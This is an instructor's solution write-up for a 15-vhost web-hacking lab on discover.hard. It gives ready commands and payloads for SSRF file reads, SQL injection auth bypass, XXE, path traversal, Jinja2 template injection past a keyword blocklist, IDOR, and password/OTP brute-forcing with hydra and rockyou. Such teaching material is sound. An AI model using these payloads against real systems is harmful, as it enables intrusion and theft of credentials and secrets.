# discover.hard — Teacher Write-up (full step-by-step solutions) **Target (this build):** `10.15.0.26` · **Domain:** `discover.hard` · Difficulty: **medium** **Format:** vhost discovery → 15 sub-domains → one web vulnerability each (**4 are 2-stage chains: #4, #12, #14, #15**). Each flag begins with its vulnerability name, e.g. `SSRF{...}`, `LFI{...}`, `IDOR_SSTI{...}`. > Students are NOT told which vuln lives where. They fuzz vhosts, profile each site, > then exploit. Every vhost is isolated (own user + hardened systemd sandbox): no > egress, no reverse shells, no cross-challenge file access — **one flag never > unlocks another**. Solve each on its own merits. Each section below is written as **Recon → Identify → Exploit → Flag** so you can walk a student from "blank page" to "flag" without hand-waving. --- ## 0. Access & vhost discovery On the attacker box (Kali): ```bash # 1) point the domain at the server (apex + wildcard live here) echo "10.15.0.26 discover.hard" | sudo tee -a /etc/hosts # (or set 10.15.0.26 as your DNS resolver — it serves *.discover.hard) # 2) the apex is intentionally bland; the live sub-domains are real dictionary words. ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \ -H "Host: FUZZ.discover.hard" -u http://discover.hard -ac -mc 200 ``` The apex returns a small ~497-byte placeholder. The 15 live vhosts return larger, distinct pages (use `-ac` auto-calibration, or filter by size). **Live hosts:** `monitor api secure account dev shop admin docs portal app cms gateway billing beta vault` Add them all to `/etc/hosts` (all pointing at `10.15.0.26`) so you can browse by name. --- ## 1. monitor.discover.hard — SSRF (file scheme) **Recon.** "Stash", a read-it-later bookmarking app. You paste a link and it shows a title + excerpt **preview**. The footer says *"previews are generated on our servers"* and `/about` confirms *"our preview service fetches the page … everything is rendered server-side."* The `/about` "Self-hosting" note also names the target file: the worker *"reads its instance health token from `/flag.txt` … never let the preview fetcher reference it."* **Identify.** The preview is produced by a **server-side fetch** of your URL, and the fetcher honours **any scheme** — including `file://`. That is a classic SSRF / local file read sink. **Exploit.** 1. Prove the server reads local files: ```bash curl -s 'http://monitor.discover.hard/?url=file:///etc/passwd' # the excerpt now contains root:x:0:0:... ``` 2. Read the flag (it is mounted at `/flag.txt` inside this service's namespace): ```bash curl -s 'http://monitor.discover.hard/?url=file:///flag.txt' ``` The file contents render as the bookmark's excerpt. **Flag:** `SSRF{file_scheme_pulled_the_local_flag}` --- ## 2. api.discover.hard — BOPLA / mass assignment **Recon.** "Cobalt" developer API docs. They publish a sandbox bearer token `cbk_live_7Q2f9aD4e1B6` and document `PATCH /api/v1/me` with editable fields `name`, `email`, `company`, `timezone`. `GET /api/v1/me` shows your profile object, which also contains `plan` and `role` (not listed as editable). **Identify.** The PATCH blindly **merges every field** of the JSON body into the user object — there is no property-level write authorization. So you can write the privileged `role` property the docs never advertised. **Exploit.** ```bash T=cbk_live_7Q2f9aD4e1B6 curl -s -X PATCH http://api.discover.hard/api/v1/me \ -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \ -d '{"role":"admin"}' ``` Promoting yourself to `admin` (or `owner`) makes the response include `organization.internal_api_key`. **Flag:** `BOLA{broken_object_property_level_authz_ftw}` --- ## 3. secure.discover.hard — Login brute-forcing **Recon.** "Atlas Corp" staff portal. `/team` shows the `first-initial.surname` username convention **and** a shared **helpdesk** account. `/it` notes: *"account lockout … is temporarily disabled"* and *"the shared helpdesk mailbox password has not been rotated since 2019."* **Identify.** Two tells: (a) **username enumeration** — unknown users get *"No account found"*, valid users get *"Invalid password"*; (b) **no lockout / no rate limit**. The login POST also carries a signed `csrf` token that must be fresh, so a brute script has to scrape a new token per attempt. **Exploit.** Brute the `helpdesk` password with rockyou (each attempt = fetch login page → read `csrf` → POST). Valid creds: `helpdesk : iloveyou1`. ```bash # pattern (pseudo): for pw in rockyou: csrf=$(GET /login | extract); POST /login csrf,helpdesk,pw ``` Logging in shows the dashboard's pinned credential note. **Flag:** `BRUTEFORCE{rate_limiting_is_not_optional_2026}` --- ## 4. account.discover.hard — SQL injection via HTTP verb tampering *(chain)* **Recon.** "IdentityOne" SSO staff console. The sign-in form **POSTs** to `/login`. A normal login goes nowhere: no demo creds are published and the POST handler is not injectable. **View the login page source** — there is a developer comment: ```html <!-- TODO(auth): retire the v1 mobile login. It still hits GET /login?username=...&password=... (the new console uses POST). --> ``` `/status` also mentions a *"v1 compatibility shim for the legacy mobile client."* **Identify.** Two bugs chained: 1. **HTTP verb tampering** — the secure code path is the **POST** handler (parameterised query). A **legacy GET** handler on the same `/login` route is still mounted "for the old mobile client". 2. **SQL injection** — that GET handler concatenates the parameters straight into the SQL string, so it is injectable. You must switch POST→GET to reach it. **Exploit.** 1. Confirm injectability on the GET path (a stray quote returns a backend error): ```bash curl -s "http://account.discover.hard/login?username=admin%27&password=x" # -> "Login backend error: unrecognized token: ..." (the query broke -> injectable) ``` 2. Bypass auth with a classic payload (admin is the first row): ```bash # comment out the password check curl -s "http://account.discover.hard/login?username=admin'--+-&password=x" # or tautology curl -s "http://account.discover.hard/login?username='+OR+'1'='1&password='+OR+'1'='1" ``` A successful injection returns the **admin dashboard**, which prints the flag. (Note: the *same* payload sent as **POST** does **not** work — proving the verb tampering step is required. `sqlmap` also solves it once aimed at the GET endpoint.) **Flag:** `BROKENAUTH{alg_none_means_anyone_is_admin}` --- ## 5. dev.discover.hard — XXE **Recon.** "BuildForge CI". `/import` accepts a pipeline definition as **XML** and previews the parsed config. The Schema panel states *"DOCTYPE declarations are processed for backward compatibility with legacy exporters"* and even prints the **runner secret path** `/opt/ctf/vhost05/secret/flag.txt`, warning it *"must never be referenced from a pipeline definition."* **Identify.** External entity resolution is enabled (XXE). The parsed `<name>` element is echoed back in the preview, giving a perfect exfil channel. **Exploit.** ```bash curl -s http://dev.discover.hard/import --data-urlencode 'xml=<?xml version="1.0"?> <!DOCTYPE p [<!ENTITY x SYSTEM "file:///opt/ctf/vhost05/secret/flag.txt">]> <pipeline><name>&x;</name></pipeline>' ``` The parsed `name` echoes the file contents. **Flag:** `XXE{external_entities_leak_local_secrets}` --- ## 6. shop.discover.hard — IDOR **Recon.** "Cartly" store. You're auto-logged-in as customer **1042**. "My orders" links to `/invoice/1042`; `/account` shows `Customer #1042`. **Identify.** Invoice IDs are **sequential** and `/invoice/<id>` does **no ownership check** (IDOR). Walking IDs downward from 1042 reaches a staff order at the round id **1000**. **Exploit.** ```bash curl -s -b cookies -c cookies http://shop.discover.hard/orders >/dev/null # get a session curl -s -b cookies http://shop.discover.hard/invoice/1000 # staff order ``` Invoice 1000 carries a gift-card code. **Flag:** `IDOR{sequential_invoice_ids_are_dangerous}` --- ## 7. admin.discover.hard — HTTP verb tampering **Recon.** "Adminify" console. `GET /admin/config` → **403** "administrator session required", and the response advertises `Allow: GET, POST, PUT, PATCH`. The `/api` page documents a *"provisioning endpoint … POST /admin/config … consumed by our CD pipeline."* **Identify.** The authorization gate only covers the **GET** branch. Any other method skips it entirely. **Exploit.** ```bash curl -s -X POST http://admin.discover.hard/admin/config ``` Returns the configuration JSON including `master_config_token`. **Flag:** `VERBTAMPERING{put_your_way_past_the_guard}` --- ## 8. docs.discover.hard — LFI (non-recursive `../` filter) **Recon.** "HelpHub" knowledge base. Articles load via `/view?doc=getting-started`. The homepage shows a yellow **"Operator notice"** (and a matching **"Self-hosting & storage paths"** sidebar article): *"this instance reads its license key from `/secret.txt` at the filesystem root … keep it out of the article viewer's reach."* That names the target file **and** hints the article viewer is the way to read it. **Identify.** `/view` builds the path from `doc` after a **single-pass** `../` strip: `doc.replace("../","")`. A **doubled token `....//`** survives the filter (removing the inner `../` leaves `../`), so traversal works. The flag lives at the filesystem root, `/secret.txt`, and the article directory is `…/vhost08/data/pages` — **5 levels** below `/`. **Exploit.** ```bash curl -s 'http://docs.discover.hard/view?doc=....//....//....//....//....//secret.txt' # proof the primitive is general: /etc/passwd is readable too curl -s 'http://docs.discover.hard/view?doc=....//....//....//....//....//etc/passwd' ``` **Flag:** `LFI{dot_dot_slash_all_the_way_to_root}` --- ## 9. portal.discover.hard — Broken auth: OTP brute-force **Recon.** "Sentinel" two-factor portal. The demo account `demo/demo` is pre-filled and clears stage 1; stage 2 asks for a **4-digit** verification code. Wrong codes only say *"Incorrect code."* **Identify.** The OTP step has **no rate limit and no lockout**, so the 4-digit code (10,000 possibilities) is brute-forceable. Keep the stage-1 session cookie across attempts. **Exploit.** ```bash curl -s -c jar http://portal.discover.hard/login --data 'username=demo&password=demo' -o /dev/null for c in $(seq -w 0 9999); do curl -s -b jar http://portal.discover.hard/verify --data "otp=$c" \ | grep -qo 'OTP{[^}]*}' && { echo "code=$c"; \ curl -s -b jar http://portal.discover.hard/verify --data "otp=$c" | grep -o 'OTP{[^}]*}'; break; } done # valid code: 8027 ``` **Flag:** `OTP{no_rate_limit_lets_me_guess_the_code}` --- ## 10. app.discover.hard — GraphQL introspection **Recon.** "Chatter" social app, GraphQL API + explorer at `/graphql` (`/explorer`). The default query lists posts. Introspection is **enabled**. **Identify.** Introspect the schema. Beyond the public `posts`/`users`/`me`, there is a hidden, **argument-less** `serviceToken` query returning a `ServiceToken` object whose `records` list holds key/value secrets — including `flag`. **Exploit.** ```bash # 1) introspect to discover the hidden field + its nested 'records' table curl -s http://app.discover.hard/graphql -H 'Content-Type: application/json' \ -d '{"query":"{__schema{queryType{fields{name}}}}"}' # 2) read it curl -s http://app.discover.hard/graphql -H 'Content-Type: application/json' \ -d '{"query":"{ serviceToken { records { key value } } }"}' ``` **Flag:** `GRAPHQL{introspection_reveals_every_secret}` --- ## 11. cms.discover.hard — SSTI (Jinja2) **Recon.** "Mailwiz" campaign builder. `/compose` renders your subject/body with **merge tags** like `{{ first_name }}` / `{{ company }}` — i.e. server-side Jinja. A small blocklist rejects `subprocess`, `popen`, `system(`, `__import__`, `eval(`, `exec(`, `/bin`, `/etc/passwd`. **Identify.** Template injection. Confirm with `{{7*7}}` → `49`. The flag is in the process **environment** (`CTF_FLAG`); reach it via a globals gadget that avoids the blocked words. **Exploit.** ```bash # (optional) dump the whole environment to find the var name: # body={{ cycler.__init__.__globals__.os.environ }} curl -s http://cms.discover.hard/compose \ --data-urlencode 'subject=hi' \ --data-urlencode 'body={{ cycler.__init__.__globals__.os.environ.CTF_FLAG }}' ``` **Flag:** `SSTI{curly_braces_can_run_my_code}` --- ## 12. gateway.discover.hard — SSRF → LFI *(chain)* **Recon.** "OpsGate" internal gateway. `/probe` sends a health check to a URL you supply, but **only to loopback hosts** (it refuses non-127.0.0.1 targets). `/` and `/registry` reveal an **internal `data-api` on `127.0.0.1:9012`** that is *not* edge-routable, and the probe page notes it *"serves config under `/v1/files`."* **Identify.** Stage 1 **SSRF**: use the probe to reach the internal-only data-api. Stage 2 **LFI**: that service's file reader (`/v1/files?file=<name>`) has no traversal guard, and the flag sits one directory above its config store → `file=../flag.txt`. **Exploit.** ```bash # (recon) the internal service tells you its endpoint shape: curl -s http://gateway.discover.hard/probe --data-urlencode 'target=http://127.0.0.1:9012/health' # (exploit) SSRF to the data-api, then traverse out of /store to the flag: curl -s http://gateway.discover.hard/probe \ --data-urlencode 'target=http://127.0.0.1:9012/v1/files?file=../flag.txt' ``` **Flag:** `SSRF_LFI{pivot_inside_then_read_the_file}` --- ## 13. billing.discover.hard — Username enumeration (username-anarchy) **Recon.** "BillFlow" staff back-office sign-in. The site only exposes an employee's **real name** — billing administrator **"Gerald Lindqvist"** (`/` and `/directory`). `/it` says staff were onboarded with a **weak default password** that many never changed, **lockout is disabled**, and to *"sign in with your account name … derived from your full name"* — but the **naming scheme is not published**. **Identify.** A classic **username-anarchy × rockyou** credential attack. The login handle is unknown (derive it from the name); the password is a weak, never-rotated default (brute from rockyou). Distinct errors make the handle enumerable first: unknown handle → *"No account named 'x'"*, valid handle → *"Incorrect password."* **Exploit.** ```bash # 1) generate candidate handles from the name username-anarchy "Gerald Lindqvist" > handles.txt # 2) enumerate handles (any password) — the valid one returns "Incorrect password", # everything else "No account named". This pins the handle WITHOUT the password. ffuf -w handles.txt -X POST -d 'username=FUZZ&password=x' \ -H 'Content-Type: application/x-www-form-urlencoded' \ -u http://billing.discover.hard/login -fr 'No account named' # valid handle: lindqvistg (lastname + first-initial — a username-anarchy permutation) # 3) brute that one handle's password with rockyou (no rate limit / no lockout) hydra -l lindqvistg -P /usr/share/wordlists/rockyou.txt \ billing.discover.hard http-post-form \ '/login:username=^USER^&password=^PASS^:No account named\|Incorrect password' # recovered password: Welcome1 (rockyou line ~40399) # 4) sign in and read the pinned mailbox message curl -s -c jar http://billing.discover.hard/login \ --data 'username=lindqvistg&password=Welcome1' -o /dev/null curl -s -b jar http://billing.discover.hard/login # dashboard prints the flag ``` **Flag:** `USERNAMEANARCHY{generate_the_handle_from_the_name}` --- ## 14. beta.discover.hard — IDOR → SSTI *(chain)* **Recon.** "PageForge" page builder (beta). Your projects (e.g. #1007, #1008) render previews **escaped**. The projects page states: *"Project IDs are sequential. Internal/system pages use a different rendering mode than customer drafts."* **Identify.** Stage 1 **IDOR**: `/project/<id>` and `/project/<id>/preview` never check ownership, and IDs are sequential — so you can open the internal **system** project **id 1**, which is flagged `mode=raw` (a banner literally says *"renders previews in raw mode (server-side template rendering)"*). Stage 2 **SSTI**: project 1's preview renders your template **unescaped**. **Exploit.** ```bash # project 1 = system / raw mode -> Jinja executes curl -s http://beta.discover.hard/project/1/preview \ --data-urlencode 'tpl={{ cycler.__init__.__globals__.os.environ.CTF_FLAG }}' # the SAME payload on your own project (1007) stays escaped -> proves the IDOR is required ``` **Flag:** `IDOR_SSTI{their_draft_became_my_payload}` --- ## 15. vault.discover.hard — GraphQL → IDOR *(chain)* **Recon.** "KeyNest" password manager, GraphQL-first (`/graphql`). `myVault` returns your items; each `id` is an opaque base64 **node id**. Decode one: `echo VmF1bHRJdGVtOjEwMDU= | base64 -d` → `VaultItem:1005`. **Identify.** Stage 1 **GraphQL introspection** exposes `vaultItem(id: ID!)`. Stage 2 **IDOR**: node ids are just base64 of `VaultItem:<n>`, sequential, and `vaultItem` does **no ownership check**. Re-encode a lower id to reach the admin item **1000**. **Exploit.** ```bash GID=$(printf 'VaultItem:1000' | base64) # VmF1bHRJdGVtOjEwMDA= curl -s http://vault.discover.hard/graphql -H 'Content-Type: application/json' \ -d "{\"query\":\"{ vaultItem(id: \\\"$GID\\\"){ title username secret } }\"}" ``` The admin item's `secret` is the flag. **Flag:** `GRAPHQL_IDOR{schema_leaked_the_node_ids}` --- ## Solvability notes (no "out of nowhere" steps) Every challenge gives the student a discoverable breadcrumb before the exploit: | # | The tell that points the way | |---|------------------------------| | 1 | footer/`/about`: "previews generated on our servers" + `/about` names `/flag.txt` → `file://` | | 2 | docs list editable fields; profile object shows a privileged `role` → mass-assign it | | 3 | `/team` shows the username scheme + shared helpdesk; `/it` says lockout disabled | | 4 | HTML `TODO(auth)` comment + `/status` reveal the legacy **GET** login → SQLi | | 5 | Schema panel prints the secret path + "DOCTYPE is processed … never reference it" | | 6 | you are `#1042`, invoice URL is `/invoice/1042`, IDs sequential → walk to 1000 | | 7 | 403 advertises `Allow: …POST…`; `/api` documents the POST provisioning endpoint | | 8 | homepage **Operator notice** + "Self-hosting" article both name `/secret.txt` | | 9 | demo/demo pre-filled, 4-digit code, only "Incorrect code" → no rate limit | | 10 | `/explorer` is GraphQL; introspection surfaces the hidden `serviceToken` | | 11 | merge tags are Jinja; `{{7*7}}`=49; dump `os.environ` to find `CTF_FLAG` | | 12 | `/registry` + probe page name the internal `127.0.0.1:9012` data-api & `/v1/files` | | 13 | name "Gerald Lindqvist" shown; `/it` = weak default pw + lockout off → anarchy×rockyou | | 14 | "IDs are sequential; internal pages use a different rendering mode" + raw-mode banner | | 15 | `myVault` ids are base64 `VaultItem:<n>`, sequential → decode/decrement/re-encode | --- ## Operations - Source of truth: `/opt/ctf-src/` (re-deploy: `bash /opt/ctf-src/deploy/install.sh`). - Runtime: `/opt/ctf/vhostNN/` (one user `ctfNN` + hardened systemd unit each). - Services: `ctf-vhostNN.service` (+ `ctf-vhost12-internal.service`). All enabled (reboot-safe). - DNS: dnsmasq wildcard; `ctf-discover-dns-heal.service` re-renders it from the live IP on boot. - Flags map: `/opt/ctf-src/deploy/flags.env`. - Tests: `python3 /opt/ctf-src/deploy/test_all.py` (15 exploits) · `test_iso.py` (isolation/egress). - Isolation: `IPAddressDeny=any` (no egress/reverse shell), per-user `0750` dirs (no cross-read); #1's flag is bound into its namespace at `/flag.txt`, #8's at root `/secret.txt` (`0400 ctf08`), #12's flag is held by a separate `ctf12i` user behind a loopback-only service (SSRF required). 
